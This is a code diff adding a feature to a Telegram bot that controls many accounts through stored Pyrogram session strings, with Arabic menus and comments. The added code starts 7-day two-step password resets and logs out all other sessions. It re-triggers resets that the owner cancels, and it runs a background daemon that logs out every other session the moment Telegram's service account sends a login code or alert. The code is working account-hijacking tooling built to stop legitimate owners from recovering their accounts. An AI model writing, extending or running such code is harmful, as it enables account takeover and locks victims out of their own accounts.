@@ -40,6 +40,8 @@ def run_async(coro):
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram import Client
+from pyrogram import filters
+from pyrogram.handlers import MessageHandler
 from pyrogram.enums import ChatType
 from pyrogram.errors import (FloodWait, AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan, PasswordHashInvalid, BadRequest, SessionPasswordNeeded)
 from pyrogram.raw import functions, types
@@ -2450,6 +2452,7 @@ def home_keyboard(uid):
     markup = InlineKeyboardMarkup()
     markup.row(InlineKeyboardButton("• إنـهـاء الـجـلـسـات الأُخـرى ☠️", callback_data="menu_terminate"))
     markup.row(InlineKeyboardButton("• إدارة الإزالـة الـتـلـقـائـيـة ⏱️", callback_data="autoterm_manage"))
+    markup.row(InlineKeyboardButton("• إدارة الـريـسـت والـقـفـل 🔒", callback_data="menu_pass_reset_manage"))
     markup.row(InlineKeyboardButton("• تـنـظـيـف شـامـل 🧹", callback_data="menu_clean"), InlineKeyboardButton("• جـلـب الـكـود ✉️", callback_data="req_code"))
     markup.row(InlineKeyboardButton("• إزالـة مـن الـبـوت 🗑️", callback_data="menu_remove"), InlineKeyboardButton("• تـسـجـيـل خـروج 🚪", callback_data="menu_logout"))
     markup.row(InlineKeyboardButton("• إدارة الـتـحـقـق بـخـطـوتـيـن 🔐", callback_data="menu_2fa_manage"))
@@ -2476,7 +2479,290 @@ def home_keyboard(uid):
 
 
 
+#داله المنزل
+#the house 
 
+
+
+
+
+
+
+
+
+
+
+#داله اعاده تعيين كلمات المرور هنا
+
+
+
+
+
+
+# ==========================================
+# 0. تحديث قاعدة البيانات تلقائياً 
+# ==========================================
+def update_db_for_reset_feature():
+    conn = get_db_conn()
+    c = conn.cursor()
+    try:
+        c.execute("ALTER TABLE sessions ADD COLUMN reset_retries INTEGER DEFAULT 0")
+        c.execute("ALTER TABLE sessions ADD COLUMN lockdown_mode INTEGER DEFAULT 0")
+        conn.commit()
+    except:
+        pass # الأعمدة موجودة مسبقاً
+    finally:
+        conn.close()
+
+update_db_for_reset_feature()
+
+# ==========================================
+# 1. القوائم المخصصة لميزة الريست
+# ==========================================
+@bot.callback_query_handler(func=lambda call: call.data == "menu_pass_reset_manage")
+def pass_reset_main_menu(call):
+    if not is_allowed(call.from_user.id): return
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("• بـدء إعـادة الـتـعـيـيـن (الـكـل/مـفـرد) 🚀", callback_data="pass_reset:start_menu"))
+    markup.row(InlineKeyboardButton("• فـحـص حـالـة الـريـسـت والـحـسـابـات 🔍", callback_data="pass_reset:check_all"))
+    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
+    
+    text = "🛂┊ **إدارة إعـادة تـعـيـيـن كـلـمـات الـمـرور:**\n\n⎉╎ هـذا الـقـسـم مـخـصـص لـعـمـل (ريـسـت 7 أيـام) لـلـحـسـابـات ومـراقـبـتـهـا وطـرد أي جـلـسـة تـحـاول الـدخـول بـشـكـل فـوري. ❤️‍🔥"
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+def pass_reset_keyboard(owner_id):
+    accounts = get_all_accounts(owner_id)
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="do_reset:all"))
+    for acc_id, phone, name, uid, _ in accounts:
+        markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"do_reset:{acc_id}"))
+    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="menu_pass_reset_manage"))
+    return markup
+
+@bot.callback_query_handler(func=lambda call: call.data == "pass_reset:start_menu")
+def pass_reset_start_menu(call):
+    if not is_allowed(call.from_user.id): return
+    bot.edit_message_text("🛂┊ إخـتـر الـحـسـاب لـبـدء الـريـسـت:\n\n⎉╎ سـيـتـم وضـع الـحـسـاب فـي وضـع الـقـفـل وتـنـفـيـذ الـريـسـت.",
+                          call.message.chat.id, call.message.message_id, 
+                          reply_markup=pass_reset_keyboard(call.from_user.id), parse_mode="Markdown")
+
+# ==========================================
+# 2. عملية بدء الريست
+# ==========================================
+@bot.callback_query_handler(func=lambda call: call.data.startswith("do_reset:"))
+def handle_start_reset(call):
+    if not is_allowed(call.from_user.id): return
+    target = call.data.split(":")[-1]
+    bot.answer_callback_query(call.id, "⏳ جاري تنفيذ أمر الريست...")
+    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري بـدء إعـادة الـتـعـيـيـن وتـفـعـيـل الـقـفـل بـسـرعـة...", parse_mode="Markdown")
+    run_async(process_start_reset_async(call.from_user.id, target, status_msg.chat.id, status_msg.message_id))
+
+async def perform_single_reset(acc_id, phone, pyro_session):
+    async with account_semaphore:
+        client = Client(f"pr_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+        try:
+            await asyncio.wait_for(client.connect(), timeout=10)
+            password_info = await client.invoke(functions.account.GetPassword())
+            
+            if not password_info.has_password:
+                return f"✅ `{phone}` ┊ لا يـوجـد كـلـمـة مـرور (جـاهـز)."
+            
+            await client.invoke(functions.account.ResetPassword())
+            
+            conn = get_db_conn()
+            c = conn.cursor()
+            c.execute("UPDATE sessions SET lockdown_mode=1, reset_retries=0 WHERE id=?", (acc_id,))
+            conn.commit()
+            conn.close()
+            
+            try: 
+                await client.invoke(functions.auth.ResetAuthorizations())
+            except: 
+                pass
+            
+            return f"✅ `{phone}` ┊ تـم بـدء الـريـسـت وتـفـعـيـل الـقـفـل الـفـوري."
+        except Exception as e:
+            if "PASSWORD_RESET_NEW_CLIENTS" in str(e):
+                return f"❌ `{phone}` ┊ انـتـظـر 24 سـاعـة قـبـل الـريـسـت."
+            return f"⚠️ `{phone}` ┊ فـشـل الـريـسـت (خـطـأ غـيـر مـتـوقـع)."
+        finally:
+            if client.is_connected: await client.disconnect()
+
+async def process_start_reset_async(owner_id, target, chat_id, msg_id):
+    accounts = get_all_accounts(owner_id)
+    if target != "all":
+        accounts = [acc for acc in accounts if str(acc[0]) == target]
+    
+    tasks = [perform_single_reset(acc[0], acc[1], acc[4]) for acc in accounts]
+    results = await asyncio.gather(*tasks)
+    
+    success_count = sum(1 for r in results if "✅" in r)
+    report = "\n".join(results)
+    final_text = f"🛂┊ **تـقـريـر بـدء الـريـسـت:**\n⎉╎ الـنـجـاح: {success_count} مـن {len(accounts)}\n\n{report}"
+    
+    bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
+
+# ==========================================
+# 3. نظام الفحص المعمق للريست 
+# ==========================================
+@bot.callback_query_handler(func=lambda call: call.data == "pass_reset:check_all")
+def check_all_resets_handler(call):
+    if not is_allowed(call.from_user.id): return
+    bot.answer_callback_query(call.id, "⏳ جاري الفحص المعمق...")
+    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري فـحـص حـالـة الـريـسـت بـسـرعـة...", parse_mode="Markdown")
+    run_async(check_all_resets_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))
+
+async def check_single_reset_status(acc_id, phone, pyro_session, owner_id):
+    async with account_semaphore:
+        conn = get_db_conn()
+        c = conn.cursor()
+        c.execute("SELECT reset_retries, lockdown_mode FROM sessions WHERE id=?", (acc_id,))
+        row = c.fetchone()
+        reset_retries = row[0] if row else 0
+        conn.close() 
+        
+        client = Client(f"chk_rs_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+        try:
+            await asyncio.wait_for(client.connect(), timeout=10)
+            await client.get_me()
+            info = await client.invoke(functions.account.GetPassword())
+            
+            conn = get_db_conn()
+            c = conn.cursor()
+
+            if not info.has_password:
+                c.execute("UPDATE sessions SET lockdown_mode=0, reset_retries=0 WHERE id=?", (acc_id,))
+                conn.commit()
+                conn.close()
+                return f"`{phone}` ┊ نـشـط ┊ انـتـهـى الـريـسـت وتـم تـعـطـيـل كـلـمـة الـمـرور ✅\n", 1
+            
+            if info.pending_reset_date:
+                diff = int(info.pending_reset_date) - int(time.time())
+                days = diff // 86400
+                hours = (diff % 86400) // 3600
+                time_str = f"{days} أيـام" if days > 0 else f"{hours} سـاعـات"
+                
+                c.execute("UPDATE sessions SET lockdown_mode=1 WHERE id=?", (acc_id,))
+                conn.commit()
+                conn.close()
+                return f"`{phone}` ┊ نـشـط ┊ تـبـقـى للـريـسـت {time_str} 🇵🇸\n", 1
+                
+            else:
+                if reset_retries < 2:
+                    try:
+                        await client.invoke(functions.account.ResetPassword())
+                        c.execute("UPDATE sessions SET reset_retries=?, lockdown_mode=1 WHERE id=?", (reset_retries + 1, acc_id))
+                        conn.commit()
+                        conn.close()
+                        return f"`{phone}` ┊ نـشـط ┊ تـم تـعـطـيـل الـريـسـت يـدويـًا وإعـادتـه ┊ 🇵🇸 ❌\n", 1
+                    except Exception:
+                        conn.close()
+                        return f"`{phone}` ┊ نـشـط ┊ تـم الإلـغـاء يـدويـاً وفـشـلـت الإعـادة ⚠️\n", 1
+                else:
+                    c.execute("UPDATE sessions SET lockdown_mode=0 WHERE id=?", (acc_id,))
+                    conn.commit()
+                    conn.close()
+                    return f"`{phone}` ┊ نـشـط ┊ انـتـهـت مـحـاولات الـريـسـت ❌\n", 1
+
+        except Exception as e:
+            return f"⚠️ `{phone}` ┊ خـطـأ فـي الـشـبـكـة أثـنـاء الـفـحـص\n", 1
+        finally:
+            if client.is_connected: await client.disconnect()
+
+async def check_all_resets_async(owner_id, chat_id, msg_id):
+    accounts = get_all_accounts(owner_id)
+    if not accounts: 
+        return bot.edit_message_text("❌ لا توجد حسابات مضافة.", chat_id, msg_id, reply_markup=home_keyboard(owner_id))
+
+    tasks = [check_single_reset_status(acc_id, phone, pyro_session, owner_id) for acc_id, phone, name, uid, pyro_session in accounts]
+    results = await asyncio.gather(*tasks)
+    
+    active_count = sum(res[1] for res in results)
+    report_text = "".join(res[0] for res in results)
+    
+    final_text = f"⎉╎ الـجـلـسـات الـنـشـطـة الآن: {active_count} مـن أصـل {len(accounts)}\n\n🛂┊ نـتـيـجـة فـحـص الـحـسـابـات:\n\n{report_text}"
+    bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
+
+# ==========================================
+# 4. المراقب الأمني الحي (Real-Time Lockdown Daemon) 🔥
+# ==========================================
+active_lockdown_clients = {}
+
+# هذا الهاندلر يصطاد أي رسالة من تيليجرام (777000) فوراً
+async def real_time_kick_handler(cli, message):
+    try:
+        # بمجرد استلام رسالة من 777000 يتم طرد كل الجلسات الأخرى فوراً لمنع سحب الحساب
+        await cli.invoke(functions.auth.ResetAuthorizations())
+    except Exception:
+        pass
+
+async def lockdown_monitor_daemon():
+    last_full_sweep = time.time()
+    
+    while True:
+        try:
+            conn = get_db_conn()
+            c = conn.cursor()
+            c.execute("SELECT id, pyro_session FROM sessions WHERE lockdown_mode = 1")
+            lockdown_accounts = c.fetchall()
+            conn.close()
+
+            current_locked_ids = {acc[0] for acc in lockdown_accounts}
+
+            # 1. إيقاف وإزالة الحسابات التي انتهى عنها القفل
+            to_remove = []
+            for acc_id in active_lockdown_clients:
+                if acc_id not in current_locked_ids:
+                    try: await active_lockdown_clients[acc_id].stop()
+                    except: pass
+                    to_remove.append(acc_id)
+            for acc_id in to_remove:
+                del active_lockdown_clients[acc_id]
+
+            # 2. تشغيل الحسابات الجديدة وربطها بالمراقب الفوري (Real-Time Listener)
+            for acc_id, pyro_session in lockdown_accounts:
+                if acc_id not in active_lockdown_clients:
+                    client = Client(f"rt_lock_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+                    # ربط الهاندلر لمراقبة حساب 777000 بشكل لحظي
+                    client.add_handler(MessageHandler(real_time_kick_handler, filters.chat(777000)))
+                    
+                    try:
+                        await client.start()
+                        active_lockdown_clients[acc_id] = client
+                    except Exception:
+                        pass # إذا الجلسة ميتة نتجاهلها وسيتم حذفها وقت الفحص
+
+            # 3. الصيانة الاحتياطية (كل 20 دقيقة) كضمان إضافي في حال لم يصل الإشعار
+            if time.time() - last_full_sweep >= 1200:
+                for acc_id, cli in active_lockdown_clients.items():
+                    try:
+                        await cli.invoke(functions.auth.ResetAuthorizations())
+                    except Exception:
+                        pass
+                last_full_sweep = time.time()
+
+            # التحقق من القاعدة وتحديث الجلسات كل 30 ثانية (لا يستهلك موارد)
+            await asyncio.sleep(30)
+            
+        except Exception:
+            await asyncio.sleep(30)
+
+# ==========================================
+# 5. تشغيل المراقب في مسار خلفي معزول (Thread) لمنع توقف البوت
+# ==========================================
+def start_lockdown_thread():
+    def run_daemon():
+        # إنشاء Event Loop منفصل تماماً لهذا المسار (Thread)
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(lockdown_monitor_daemon())
+        
+    # تشغيل في الخلفية (daemon=True يعني أنه سيُغلق تلقائياً إذا أغلقت البوت)
+    t = threading.Thread(target=run_daemon, daemon=True)
+    t.start()
+
+# تشغيل المراقبة فوراً في الخلفية
+start_lockdown_thread()
 
 
 
